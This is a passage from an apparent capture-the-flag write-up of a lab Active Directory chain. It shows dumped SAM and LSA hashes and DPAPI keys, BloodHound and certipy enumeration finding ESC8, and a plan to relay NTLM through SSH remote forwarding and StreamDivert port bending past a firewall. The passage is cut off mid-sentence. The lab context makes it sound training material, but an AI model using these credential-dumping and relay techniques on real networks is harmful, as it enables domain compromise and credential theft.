<span class="n">DefaultAccount</span><span class="p">:</span><span class="mi">503</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cf</span><span class="o">**********</span><span class="mi">0</span><span class="p">:::</span>
<span class="n">WDAGUtilityAccount</span><span class="p">:</span><span class="mi">504</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">bc</span><span class="o">**********</span><span class="mi">34</span><span class="p">:::</span>
<span class="n">backup</span><span class="p">:</span><span class="mi">1002</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">3</span><span class="n">fe84dbae69d1ce96d3babfb58a848cb</span><span class="p">:::</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">cached</span> <span class="n">domain</span> <span class="n">logon</span> <span class="n">information</span> <span class="p">(</span><span class="n">domain</span><span class="o">/</span><span class="n">username</span><span class="p">:</span><span class="nb">hash</span><span class="p">)</span>
<span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span><span class="o">/</span><span class="n">sasrv200</span><span class="p">:</span><span class="n">$</span><span class="n">DCC2</span><span class="n">$</span><span class="mi">10240</span><span class="c1">#sasrv200#**********: (2024-01-30 20:13:30)</span>
<span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span><span class="o">/</span><span class="n">Clare</span><span class="o">.</span><span class="n">Frost</span><span class="p">:</span><span class="n">$</span><span class="n">DCC2</span><span class="n">$</span><span class="mi">10240</span><span class="c1">#Clare.Frost#**********: (2024-01-21 15:01:24)</span>
<span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span><span class="o">/</span><span class="n">Administrator</span><span class="p">:</span><span class="n">$</span><span class="n">DCC2</span><span class="n">$</span><span class="mi">10240</span><span class="c1">#Administrator#**********: (2024-01-21 15:17:37)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">LSA</span> <span class="n">Secrets</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">$</span><span class="n">MACHINE</span><span class="o">.</span><span class="n">ACC</span> 
<span class="n">KAIJU</span>\<span class="n">BERSRV200</span><span class="n">$</span><span class="p">:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="o">**********</span>
<span class="n">KAIJU</span>\<span class="n">BERSRV200</span><span class="n">$</span><span class="p">:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="o">**********</span>
<span class="n">KAIJU</span>\<span class="n">BERSRV200</span><span class="n">$</span><span class="p">:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="n">md5</span><span class="p">:</span><span class="o">**********</span>
<span class="n">KAIJU</span>\<span class="n">BERSRV200</span><span class="n">$</span><span class="p">:</span><span class="n">plain_password_hex</span><span class="p">:</span><span class="o">**********</span>
<span class="n">KAIJU</span>\<span class="n">BERSRV200</span><span class="n">$</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="o">**********</span><span class="p">:::</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DefaultPassword</span> 
<span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>\<span class="n">clare</span><span class="o">.</span><span class="n">frost</span><span class="p">:</span><span class="o">**********</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">DPAPI_SYSTEM</span> 
<span class="n">dpapi_machinekey</span><span class="p">:</span><span class="mh">0x2aa75aaaf206bfaee9c962443bdf9c2b6f3dca59</span>
<span class="n">dpapi_userkey</span><span class="p">:</span><span class="mh">0x43b9ced8e9f1fe8ccad60dbdff5563d9ce01503b</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">_SC_filezilla</span><span class="o">-</span><span class="n">server</span> 
<span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>\<span class="n">sasrv200</span><span class="p">:</span><span class="o">**********</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="o">...</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Stopping</span> <span class="n">service</span> <span class="n">RemoteRegistry</span>
</pre></div>
<p>As observed, all password hashes were extracted from SAM and LSA. You might also notice that <code>clare.frost</code>‚Äôs password was recovered, this came from the AutoLogon credentials.</p><br/>
<p>Now that we have domain credentials, we can begin enumerating the domain. For example, we could use <code>bloodhound-python</code> to gather information about users, groups, ACLs, and more:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="nb">all</span> <span class="o">-</span><span class="n">u</span> <span class="n">clare</span><span class="o">.</span><span class="n">frost</span> <span class="o">-</span><span class="n">p</span> <span class="o">**********</span> <span class="o">--</span><span class="nb">zip</span> <span class="o">-</span><span class="n">ns</span> <span class="mf">10.10.221.53</span> <span class="o">-</span><span class="n">d</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">dc</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> 
<span class="n">INFO</span><span class="p">:</span> <span class="n">BloodHound</span><span class="o">.</span><span class="n">py</span> <span class="k">for</span> <span class="n">BloodHound</span> <span class="n">LEGACY</span> <span class="p">(</span><span class="n">BloodHound</span> <span class="mf">4.2</span> <span class="n">and</span> <span class="mf">4.3</span><span class="p">)</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="n">AD</span> <span class="n">domain</span><span class="p">:</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Getting</span> <span class="n">TGT</span> <span class="k">for</span> <span class="n">user</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">domains</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">domains</span> <span class="n">in</span> <span class="n">the</span> <span class="n">forest</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">3</span> <span class="n">computers</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">207</span> <span class="n">users</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">53</span> <span class="n">groups</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">gpos</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">ous</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">19</span> <span class="n">containers</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">0</span> <span class="n">trusts</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Starting</span> <span class="n">computer</span> <span class="n">enumeration</span> <span class="k">with</span> <span class="mi">10</span> <span class="n">workers</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Querying</span> <span class="n">computer</span><span class="p">:</span> <span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Querying</span> <span class="n">computer</span><span class="p">:</span> <span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Querying</span> <span class="n">computer</span><span class="p">:</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Done</span> <span class="n">in</span> <span class="mi">00</span><span class="n">M</span> <span class="mi">50</span><span class="n">S</span>
<span class="n">INFO</span><span class="p">:</span> <span class="n">Compressing</span> <span class="n">output</span> <span class="n">into</span> <span class="mi">20250912164937</span><span class="n">_bloodhound</span><span class="o">.</span><span class="n">zip</span>
</pre></div>
<p>At this point, you can start the Neo4j database and import this zip file into BloodHound. </p><br/>
<p>Now, we can list Domain Users for example:</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-14.png"/></p>
<p>Okay, there's plenty of them, 205 to be exact. You can also list domain computers:</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-15.png"/></p>
<p>Interestingly, just appears <code>BERSRV200</code> (the server we're in). Turns out that the other server (not the DC we have identified earlier, because DCs are not member of domain computers) is another DC, specifically, a Read-Only Domain Controller (which indicates that is just a replication DC). Keep this in mind, because it will be necessary for the escalation path.</p><br/>
<p>You can continue enumerating with BloodHound, but at this point I'll just continue.</p><br/>
<h3>Active Directory Certificate Services</h3><br/>
<p>One of the main reasons I wanted to write this is because of the ADCS abuse scenario in this chain. Active Directory Certificate Services (ADCS) is Microsoft‚Äôs public key infrastructure (PKI) implementation, which integrates tightly with Active Directory and is often used to issue and manage digital certificates within a domain. Misconfigurations in ADCS can be abused to escalate privileges, often through mechanisms like Kerberos authentication.</p><br/>
<p>We‚Äôve already covered this topic in detail in my <a href="https://elswix.github.io/articles/17/active-directory-certificate-services.html">article</a>, where I explain how ADCS works and specifically how Kerberos authentication can be exploited. Here, I just want to show you how to perform the attack through ProxyChains, using a slightly different approach.</p><br/>
<p>When enumerating ADCS instances with <code>netexec</code>, we found the following:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="o">-</span><span class="n">q</span> <span class="n">nxc</span> <span class="n">ldap</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">u</span> <span class="n">clare</span><span class="o">.</span><span class="n">frost</span> <span class="o">-</span><span class="n">p</span> <span class="o">**********</span> <span class="o">-</span><span class="n">M</span> <span class="n">adcs</span>
<span class="n">LDAP</span>        <span class="mf">10.10.221.53</span>   <span class="mi">389</span>    <span class="n">BERSRV100</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">BERSRV100</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">)</span>
<span class="n">LDAP</span>        <span class="mf">10.10.221.53</span>   <span class="mi">389</span>    <span class="n">BERSRV100</span>        <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>\<span class="n">clare</span><span class="o">.</span><span class="n">frost</span><span class="p">:</span><span class="o">**********</span> 
<span class="n">ADCS</span>        <span class="mf">10.10.221.53</span>   <span class="mi">389</span>    <span class="n">BERSRV100</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">LDAP</span> <span class="n">search</span> <span class="k">with</span> <span class="n">search</span> <span class="nb">filter</span> <span class="s1">'(objectClass=pKIEnrollmentService)'</span>
<span class="n">ADCS</span>        <span class="mf">10.10.221.53</span>   <span class="mi">389</span>    <span class="n">BERSRV100</span>        <span class="n">Found</span> <span class="n">PKI</span> <span class="n">Enrollment</span> <span class="n">Server</span><span class="p">:</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">ADCS</span>        <span class="mf">10.10.221.53</span>   <span class="mi">389</span>    <span class="n">BERSRV100</span>        <span class="n">Found</span> <span class="n">CN</span><span class="p">:</span> <span class="n">kaiju</span><span class="o">-</span><span class="n">CA</span>
<span class="n">ADCS</span>        <span class="mf">10.10.221.53</span>   <span class="mi">389</span>    <span class="n">BERSRV100</span>        <span class="n">Found</span> <span class="n">PKI</span> <span class="n">Enrollment</span> <span class="n">WebService</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">bersrv100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="o">/</span><span class="n">kaiju</span><span class="o">-</span><span class="n">CA_CES_Kerberos</span><span class="o">/</span><span class="n">service</span><span class="o">.</span><span class="n">svc</span><span class="o">/</span><span class="n">CES</span>
<span class="n">ADCS</span>        <span class="mf">10.10.221.53</span>   <span class="mi">389</span>    <span class="n">BERSRV100</span>        <span class="n">Found</span> <span class="n">PKI</span> <span class="n">Enrollment</span> <span class="n">Server</span><span class="p">:</span> <span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">ADCS</span>        <span class="mf">10.10.221.53</span>   <span class="mi">389</span>    <span class="n">BERSRV100</span>        <span class="n">Found</span> <span class="n">CN</span><span class="p">:</span> <span class="n">kaiju</span><span class="o">-</span><span class="n">sub</span><span class="o">-</span><span class="n">CA</span>
</pre></div>
<p>ADCS is deployed in the environment, there are two Certification Authorities (CAs) and there is an Enrollment WebService available. This is interesting because it could potentially be vulnerable to ESC8, which I‚Äôve explained in detail in my <a href="link">article</a>.</p><br/>
<p>You can use <code>certipy</code> to see if it reports the instance vulnerable to ESC8:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="n">certipy</span> <span class="n">find</span> <span class="o">-</span><span class="n">vulnerable</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">u</span> <span class="n">clare</span><span class="o">.</span><span class="n">frost</span> <span class="o">-</span><span class="n">p</span> <span class="o">************</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">config</span> <span class="n">file</span> <span class="n">found</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains</span><span class="o">.</span><span class="n">conf</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">preloading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libproxychains</span><span class="o">.</span><span class="n">so</span><span class="mf">.4</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">DLL</span> <span class="n">init</span><span class="p">:</span> <span class="n">proxychains</span><span class="o">-</span><span class="n">ng</span> <span class="mf">4.17</span>
<span class="n">Certipy</span> <span class="n">v5</span><span class="mf">.0.3</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>  <span class="o">...</span>  <span class="mf">10.10.221.53</span><span class="p">:</span><span class="mi">636</span>  <span class="o">...</span>  <span class="n">OK</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">templates</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">33</span> <span class="n">certificate</span> <span class="n">templates</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">certificate</span> <span class="n">authorities</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">certificate</span> <span class="n">authorities</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">22</span> <span class="n">enabled</span> <span class="n">certificate</span> <span class="n">templates</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Finding</span> <span class="n">issuance</span> <span class="n">policies</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">13</span> <span class="n">issuance</span> <span class="n">policies</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">0</span> <span class="n">OIDs</span> <span class="n">linked</span> <span class="n">to</span> <span class="n">templates</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">text</span> <span class="n">output</span> <span class="n">to</span> <span class="s1">'20250912173401_Certipy.txt'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Wrote</span> <span class="n">text</span> <span class="n">output</span> <span class="n">to</span> <span class="s1">'20250912173401_Certipy.txt'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">JSON</span> <span class="n">output</span> <span class="n">to</span> <span class="s1">'20250912173401_Certipy.json'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Wrote</span> <span class="n">JSON</span> <span class="n">output</span> <span class="n">to</span> <span class="s1">'20250912173401_Certipy.json'</span>
</pre></div>
<p>Now, let's read the output file <code>20250912173401_Certipy.txt</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="mi">20250912173401</span><span class="n">_Certipy</span><span class="o">.</span><span class="n">txt</span>
<span class="n">Certificate</span> <span class="n">Authorities</span>
  <span class="mi">0</span>
    <span class="n">CA</span> <span class="n">Name</span>                             <span class="p">:</span> <span class="n">kaiju</span><span class="o">-</span><span class="n">sub</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">DNS</span> <span class="n">Name</span>                            <span class="p">:</span> <span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
    <span class="n">Certificate</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">kaiju</span><span class="o">-</span><span class="n">sub</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">kaiju</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">vl</span>
    <span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
    <span class="n">Permissions</span>
      <span class="n">Owner</span>                             <span class="p">:</span> <span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span>\<span class="n">Administrators</span>
      <span class="n">Access</span> <span class="n">Rights</span>
        <span class="n">ManageCa</span>                        <span class="p">:</span> <span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span>\<span class="n">Administrators</span>
                                          <span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span>\<span class="n">Domain</span> <span class="n">Admins</span>
                                          <span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
        <span class="n">ManageCertificates</span>              <span class="p">:</span> <span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span>\<span class="n">Administrators</span>
                                          <span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span>\<span class="n">Domain</span> <span class="n">Admins</span>
                                          <span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>
        <span class="n">Enroll</span>                          <span class="p">:</span> <span class="n">KAIJU</span><span class="o">.</span><span class="n">VL</span>\<span class="n">Authenticated</span> <span class="n">Users</span>
    <span class="p">[</span><span class="n">!</span><span class="p">]</span> <span class="n">Vulnerabilities</span>
      <span class="n">ESC8</span>                              <span class="p">:</span> <span class="n">Web</span> <span class="n">Enrollment</span> <span class="n">is</span> <span class="n">enabled</span> <span class="n">over</span> <span class="n">HTTP</span><span class="o">.</span>
  <span class="mi">1</span>
    <span class="n">CA</span> <span class="n">Name</span>                             <span class="p">:</span> <span class="n">kaiju</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">DNS</span> <span class="n">Name</span>                            <span class="p">:</span> <span class="n">BERSRV100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
    <span class="n">Certificate</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">kaiju</span><span class="o">-</span><span class="n">CA</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">kaiju</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">vl</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
    <span class="p">[</span><span class="n">!</span><span class="p">]</span> <span class="n">Vulnerabilities</span>
      <span class="n">ESC8</span>                              <span class="p">:</span> <span class="n">Web</span> <span class="n">Enrollment</span> <span class="n">is</span> <span class="n">enabled</span> <span class="n">over</span> <span class="n">HTTP</span><span class="o">.</span>
</pre></div>
<p>It seems that we can exploit ESC8.</p><br/>
<h3>Domain Escalation - ESC8</h3><br/>
<p>In short, ESC8 abuses the Certificate Enrollment WebService and Certificate Enrollment Policy Web Service, which allow domain users to request certificates over HTTP/HTTPS. If these services are misconfigured (for example, allowing authentication with NTLM or exposing them externally), we can relay authentication to the enrollment service and obtain a valid certificate on behalf of a victim. That certificate can then be used for Kerberos authentication (via PKINIT), effectively allowing us to impersonate the victim and access domain resources.</p><br/>
<p>Since we now have valid domain credentials, we could use tools like <code>PetitPotam</code> to trigger an NTLM authentication from the machine account of any computer, including Domain Controllers. We can then relay this authentication to the Certificate Enrollment Web Service (CES) endpoint, which would allow us to generate a PFX certificate. That certificate can later be used for authentication via PKINIT.</p><br/>
<p>However, we have an obstacle: due to firewall rules, there‚Äôs no outbound connection to our machine. We already solved inbound connections using ProxyChains, but outbound traffic can‚Äôt be handled in the same way.</p><br/>
<p>This means we cannot directly trigger authentication against our attacker machine. Instead, we need to trigger authentication to another domain computer we control and then redirect that traffic back to us through an SSH tunnel, avoiding the firewall restriction.</p><br/>
<p>Here‚Äôs where the combination of <strong>Remote Port Forwarding</strong> and <strong>Port Bending</strong> comes into play:</p><br/>
<ul>
<li>
<p>With SSH Remote Port Forwarding, we can open a listener on the victim machine (for example, on port <code>8000</code>). Any traffic sent to that port will be forwarded through the SSH tunnel to our attacker machine. In our case, port <code>8000</code> on the victim will map to port <code>445</code> on our attacker machine.</p><br/>
</li>
<li>
<p>The challenge is that SMB traffic won‚Äôt normally be sent to port <code>8000</code>. This is where <strong>Port Bending</strong> steps in. By using a tool like <a href="https://github.com/jellever/StreamDivert">StreamDivert</a>, we can intercept SMB traffic coming from a specific IP address and ‚Äúbend‚Äù it so that instead of going to the real port <code>445</code>, it gets redirected locally to port <code>8000</code>.</p><br/>
</li>
<li>
<p>Once redirected, SSH takes care of forwarding that traffic to our attacker machine, effectively tunneling SMB communication through a port that the firewall does allow.</p><br/>
</li>
</ul>
<p>In other words, Port Bending allows us to locally reroute restricted SMB traffic into the SSH Remote Port Forwarding channel, bypassing the outbound firewall limitation.</p><br/>
<p>So, what‚Äôs our strategy? We‚Äôre going to do the following: first, set up SSH remote port forwarding to open port <code>8000</code> on the victim machine, listening for connections. Those connections will then be redirected to our attacker machine on port <code>445</code>, where <code>ntlmrelayx</code> will be running. Next, we‚Äôll configure <code>StreamDivert</code> to perform PortBending by redirecting SMB connections coming from <code>BERSRV100</code> (the DC we‚Äôll force to authenticate against <code>BERSRV200</code>, the machine we control) to local port <code>8000</code>. Since port <code>8000</code> is already bound to the SSH remote forwarding, the connection will finally be redirected to our attacker machine on port <code>445</code>.</p><br/>
<p>First, let's set up the Remote Port Forwarding tunnel:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">sshpass</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'Na**********n25'</span> <span class="n">ssh</span> <span class="root1">administrator@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">R</span> <span class="mi">8000</span><span class="p">:</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">445</span> <span class="o">-</span><span class="n">D</span> <span class="mi">1080</span>
<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.20348.2159</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>

<span class="root1">administrator@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span><span class="o">&gt;</span>
</pre></div>
<p>Then, let's extract all the StreamDivert files onto the victim machine:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="nb">dir</span>


    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span>


<span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
<span class="o">----</span>                 <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">09</span> <span class="n">AM</span>             <span class="mi">41</span> <span class="n">config</span><span class="o">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">11</span> <span class="n">AM</span>          <span class="mi">11427</span> <span class="n">log</span><span class="o">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">51</span> <span class="n">AM</span>         <span class="mi">659456</span> <span class="n">StreamDivert</span><span class="o">.</span><span class="n">exe</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">02</span> <span class="n">AM</span>       <span class="mi">10055680</span> <span class="n">StreamDivert</span><span class="o">.</span><span class="n">pdb</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">56</span> <span class="n">AM</span>          <span class="mi">47104</span> <span class="n">WinDivert</span><span class="o">.</span><span class="n">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">11</span><span class="p">:</span><span class="mi">01</span> <span class="n">AM</span>          <span class="mi">75952</span> <span class="n">WinDivert32</span><span class="o">.</span><span class="n">sys</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">10</span><span class="p">:</span><span class="mi">55</span> <span class="n">AM</span>          <span class="mi">90288</span> <span class="n">WinDivert64</span><span class="o">.</span><span class="n">sys</span>


<span class="evrm">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span>
</pre></div>
<p>To run this, you need Administrator or <code>NT AUTHORITY\SYSTEM</code> privileges, since setting up these redirections requires elevated access. It‚Äôs important to note that the <code>config.txt</code> file must follow the exact format expected, otherwise, the program won‚Äôt parse it correctly, and the port bending will fail, which can quickly turn into a headache.</p><br/>
<p>For example, I created mine using:</p><br/>
